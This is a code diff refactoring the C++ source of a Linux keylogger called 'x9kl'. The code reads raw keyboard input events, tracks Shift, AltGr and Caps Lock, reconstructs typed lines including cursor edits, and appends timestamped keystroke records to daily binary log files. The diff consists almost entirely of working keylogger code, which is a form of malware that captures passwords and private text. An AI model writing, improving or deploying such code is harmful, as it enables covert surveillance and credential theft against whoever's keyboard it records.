@@ -3,9 +3,9 @@
 #include <linux/input.h>
 #include <sys/select.h>
 #include <sys/stat.h>
+#include <time.h>
 #include <unistd.h>
 
-#include <chrono>
 #include <csignal>
 #include <cstring>
 #include <ctime>
@@ -28,7 +28,7 @@ struct x9kl_ctx_t {
   bool is_altgr_pressed;
   uint32_t buffer_cursor;
   std::vector<int> kb_fds;
-  std::vector<uint8_t> kb_buffer;
+  std::vector<uint16_t> kb_buffer;
   struct input_event event;
 
   x9kl_ctx_t() : is_capslock_on{false},
@@ -113,74 +113,97 @@ static void destroy_ctx(x9kl_ctx_t *ctx) {
   }
 }
 
-void handle_enter(x9kl_ctx_t *ctx) {
-  char date[9]{0}, timestamp[9]{0};
+static void write_buffer_to_log(x9kl_ctx_t *ctx) {
+  struct tm *time;
+  char date[9]{0};
 
-  if (!ctx->event.value || ctx->kb_buffer.empty()) {
-    return;
-  }
+  {
+    std::time_t raw_time;
 
-  //{
-    auto now =
-        std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
-    auto time = std::localtime(&now);
-
+    std::time(&raw_time);
+    time = std::localtime(&raw_time);
     std::strftime(date, sizeof(date), "%d%m%Y", time);
-  //}
+  }
 
   std::ofstream log_file{std::string{LOGS_DIR} + "/log_" + date,
                          std::ios::binary | std::ios::app};
 
-  std::vector<uint8_t> date_buff{ (uint8_t)time->tm_hour, (uint8_t)time->tm_min, (uint8_t)time->tm_sec };
-  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor, KEY_ENTER);
-  log_file.write((const char *)date_buff.data(), date_buff.size());
-  log_file.write((const char *)ctx->kb_buffer.data(),
-                 ctx->kb_buffer.size());
+  std::vector<uint16_t> log_entry;
 
+  log_entry.emplace_back((time->tm_hour << 8) | time->tm_min);
+  log_entry.insert(log_entry.end(), ctx->kb_buffer.begin(),
+                   ctx->kb_buffer.end());
+
+  log_file.write((const char *)log_entry.data(), log_entry.size() * 2);
+}
+
+static void handle_enter(x9kl_ctx_t *ctx) {
+  if (!ctx->event.value || ctx->kb_buffer.empty()) {
+    return;
+  }
+
+  X9KL_DEBUG("handling enter key\n");
+
+  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor, KEY_ENTER);
+
+  write_buffer_to_log(ctx);
+  // cleanup
   ctx->kb_buffer.clear();
   ctx->buffer_cursor = 0;
 }
 
-void handle_capslock(x9kl_ctx_t *ctx) {
+static void handle_capslock(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
+
+  X9KL_DEBUG("handling capslock key\n");
 
   ctx->is_capslock_on = !ctx->is_capslock_on;
 }
 
-void handle_shift(x9kl_ctx_t *ctx) {
-  ctx->is_shift_pressed = ctx->event.value;
+static void handle_shift(x9kl_ctx_t *ctx) {
+  X9KL_DEBUG("handling shift key\n");
+
+  ctx->is_shift_pressed = !ctx->is_shift_pressed;
 }
 
-void handle_altgr(x9kl_ctx_t *ctx) {
-  ctx->is_altgr_pressed = ctx->event.value;
+static void handle_altgr(x9kl_ctx_t *ctx) {
+  X9KL_DEBUG("handling altgr key\n");
+
+  ctx->is_altgr_pressed = !ctx->is_altgr_pressed;
 }
 
-void handle_delete(x9kl_ctx_t *ctx) {
+static void handle_delete(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
+
+  X9KL_DEBUG("handling delete key\n");
 
   if (ctx->buffer_cursor < ctx->kb_buffer.size()) {
     ctx->kb_buffer.erase(ctx->kb_buffer.begin() + ctx->buffer_cursor);
   }
 }
 
-void handle_backspace(x9kl_ctx_t *ctx) {
+static void handle_backspace(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
+
+  X9KL_DEBUG("handling backspace key\n");
 
   if (!ctx->kb_buffer.empty()) {
     ctx->kb_buffer.erase(ctx->kb_buffer.begin() + (--ctx->buffer_cursor));
   }
 }
 
-void handle_arrow(x9kl_ctx_t *ctx) {
+static void handle_arrow(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
+
+  X9KL_DEBUG("handling arrow key\n");
 
   auto current_key = ctx->event.code;
 
@@ -188,11 +211,25 @@ void handle_arrow(x9kl_ctx_t *ctx) {
                                                  : (ctx->buffer_cursor + 1);
 }
 
-void handle_key(x9kl_ctx_t *ctx) {
+static void handle_ascii_key(x9kl_ctx_t *ctx) {
   if (!ctx->event.value) {
     return;
   }
 
+  X9KL_DEBUG("handling ascii key\n");
+
+  uint8_t flags = (ctx->is_altgr_pressed << 2) | (ctx->is_shift_pressed << 1) |
+                  ctx->is_capslock_on;
+  uint16_t data = (flags << 8) | ctx->event.code;
+
+  X9KL_DEBUG("flags = %x\n", flags);
+  X9KL_DEBUG("code = %d\n", ctx->event.code);
+  X9KL_DEBUG("data = %lx\n", data);
+
+  ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++, data);
+}
+
+void handle_key(x9kl_ctx_t *ctx) {
   switch (ctx->event.code) {
     case KEY_ENTER:
       handle_enter(ctx);
@@ -216,14 +253,9 @@ void handle_key(x9kl_ctx_t *ctx) {
     case KEY_RIGHTALT:
       handle_altgr(ctx);
       break;
-    default: {
-      //if (ctx->is_capslock_on && (key_char >= 'a' || key_char <= 'z')) {
-    //  //  key_char -= 32;
-    //  //}
-
-      ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++,
-                            ctx->event.code);
-     }
+    default:
+      handle_ascii_key(ctx);
+      break;
   }
 }
 
